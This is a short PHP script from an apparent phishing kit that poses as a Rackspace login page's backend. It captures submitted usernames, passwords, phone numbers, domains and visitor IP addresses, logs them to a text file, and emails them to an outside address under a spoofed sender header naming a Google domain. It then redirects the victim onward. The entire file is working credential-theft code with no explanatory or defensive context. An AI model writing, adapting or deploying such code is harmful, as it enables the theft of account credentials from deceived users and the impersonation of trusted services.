﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ RACKSPACE LOG +-----------connect---\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "phonenumber: ".$_POST['phonenumber']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Authur-----------------\n";



$file = "Jesus.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);




$send = "kerrymarley@hotmail.com, kerrymarley@hotmail.com";


$subject = "RACKSPACE .$ip.";
$headers = "From: RACKSPACE  <logs@www.accounts.google.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
echo "<meta http-equiv='Refresh' content='0;URL=index1.html' />";
	  

?>